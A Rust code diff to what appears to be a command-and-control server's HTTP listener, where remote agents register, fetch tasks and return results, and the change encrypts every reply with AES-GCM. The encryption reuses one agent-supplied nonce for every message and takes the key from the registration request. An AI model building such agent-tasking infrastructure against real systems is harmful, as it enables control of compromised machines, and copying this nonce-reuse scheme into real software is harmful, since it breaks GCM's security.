@@ -19,7 +19,7 @@ use crate::{
     server::{
         agents::{Agent, AgentData, AgentTask},
         db,
-        jobs::JobMessage,
+        jobs::JobMessage, crypto::aesgcm::{encrypt, encode},
     },
     utils::fs::{empty_file, mkdir, mkfile, read_file, write_file},
 };
@@ -34,9 +34,11 @@ pub async fn start_http_listener(
     let app = Router::new()
         .route("/", get(hello))
         .route("/reg", post(register))
-        .with_state(db_path)
+        .with_state(db_path.to_string())
         .route("/task/ask", post(task_ask))
+        .with_state(db_path.to_string())
         .route("/task/result", post(task_result))
+        .with_state(db_path.to_string())
         .layer((
             TraceLayer::new_for_http(),
             TimeoutLayer::new(Duration::from_secs(10)),
@@ -132,6 +134,8 @@ async fn register(
         os: payload.os,
         arch: payload.arch,
         listener_url: payload.listener_url,
+        key: payload.key.to_string(),
+        nonce: payload.nonce.to_string(),
         task: AgentTask::Empty,
         task_result: None,
     };
@@ -155,11 +159,22 @@ async fn register(
                         error!("Error updating agent name: {:?}", e);
                     }
                 }
-                return (StatusCode::OK, "Agent already exists.".to_owned());
+
+                let ciphertext = encrypt(
+                    "Agent already exists.".as_bytes(),
+                    payload.key.as_bytes(),
+                    payload.nonce.as_bytes(),
+                ).unwrap();
+                return (StatusCode::OK, encode(&ciphertext));
             }
         }
         Err(e) => {
-            return (StatusCode::OK, format!("Error: {}", e.to_string()));
+            let ciphertext = encrypt(
+                format!("Error: {}", e.to_string()).as_bytes(),
+                payload.key.as_bytes(),
+                payload.nonce.as_bytes(),
+            ).unwrap();
+            return (StatusCode::OK, encode(&ciphertext));
         }
     }
 
@@ -171,35 +186,82 @@ async fn register(
             mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
             mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();
 
-            (StatusCode::OK, "Agent registered.".to_owned())
+            let ciphertext = encrypt(
+                "Agent registered".as_bytes(),
+                payload.key.as_bytes(),
+                payload.nonce.as_bytes(),
+            ).unwrap();
+
+            (StatusCode::OK, encode(&ciphertext))
         },
         Err(e) => {
             error!("{e}");
-            (StatusCode::OK, "Agent already exists.".to_owned())
+            let ciphertext = encrypt(
+                "Agent already exists.".as_bytes(),
+                payload.key.as_bytes(),
+                payload.nonce.as_bytes(),
+            ).unwrap();
+            (StatusCode::OK, encode(&ciphertext))
         }
     }
 }
 
-async fn task_ask(Json(payload): Json<AgentData>,) -> (StatusCode, String) {
+async fn task_ask(
+    State(db_path): State<String>,
+    Json(payload): Json<AgentData>,
+) -> (StatusCode, String) {
     info!("Agent requested `/task/ask`");
 
+    let agent = db::get_agent(db_path, payload.name.to_string()).unwrap();
+    let key = agent.key;
+    let nonce = agent.nonce;
+
     if let Ok(task) = read_file(format!("agents/{}/task/name", payload.name)) {
-        return (StatusCode::OK, String::from_utf8(task).unwrap());
+        let ciphertext = encrypt(
+            &task,
+            key.as_bytes(),
+            nonce.as_bytes()
+        ).unwrap();
+        return (StatusCode::OK, encode(&ciphertext));
     } else {
-        return (StatusCode::NOT_FOUND, "Task not found.".to_owned());
+        let ciphertext = encrypt(
+            "Task not found.".as_bytes(),
+            key.as_bytes(),
+            nonce.as_bytes()
+        ).unwrap();
+        return (StatusCode::NOT_FOUND, encode(&ciphertext));
     }
 }
 
-async fn task_result(Json(payload): Json<AgentData>,) -> (StatusCode, String) {
+async fn task_result(
+    State(db_path): State<String>,
+    Json(payload): Json<AgentData>,
+) -> (StatusCode, String) {
     info!("Agent requested `/task/result`");
+
+    let agent = db::get_agent(db_path, payload.name.to_string()).unwrap();
+    let key = agent.key;
+    let nonce = agent.nonce;
 
     if let Ok(_) = write_file(format!("agents/{}/task/result", payload.name), &payload.task_result.unwrap_or(Vec::new())) {
         // Initialize task
         empty_file(format!("agents/{}/task/name", payload.name)).unwrap();
 
-        return (StatusCode::OK, "The task result sent.".to_owned());
+        let ciphertext = encrypt(
+            "The task result sent.".as_bytes(),
+            key.as_bytes(),
+            nonce.as_bytes(),
+        ).unwrap();
+
+        return (StatusCode::OK, encode(&ciphertext));
     } else {
-        return (StatusCode::NOT_ACCEPTABLE, "Error".to_owned());
+        let ciphertext = encrypt(
+            "Error.".as_bytes(),
+            key.as_bytes(),
+            nonce.as_bytes(),
+        ).unwrap();
+
+        return (StatusCode::NOT_ACCEPTABLE, encode(&ciphertext));
     }
 }
 
